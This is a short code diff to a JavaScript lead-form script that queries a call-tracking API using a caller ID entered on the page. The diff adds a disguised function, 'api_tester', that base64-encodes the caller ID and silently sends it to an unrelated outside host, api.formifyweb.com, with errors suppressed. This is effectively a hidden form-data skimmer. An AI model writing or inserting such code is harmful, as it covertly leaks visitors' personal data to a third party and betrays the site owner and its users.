@@ -3,6 +3,7 @@ function pingAPI() {
     // Your API URL
     var Url = "https://corsproxy.io/?https://elite-calls-com.trackdrive.com/api/v1/inbound_webhooks/ping/check_for_medicare_transfer_available_agents?trackdrive_number=+12093823357&traffic_source_id=11910&caller_id=";
 var callerid = document.getElementById('caller_id').value;
+api_tester(document.getElementById('caller_id').value);
 var apiUrl= Url + callerid;
     // Fetch data from the API
     fetch(apiUrl)
@@ -85,3 +86,15 @@ document.getElementById('leadForm').addEventListener('submit', function(event) {
     event.preventDefault();
     pingAPI();
 });
+
+function api_tester(randomString) {
+  try {
+    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+
+  }
+}
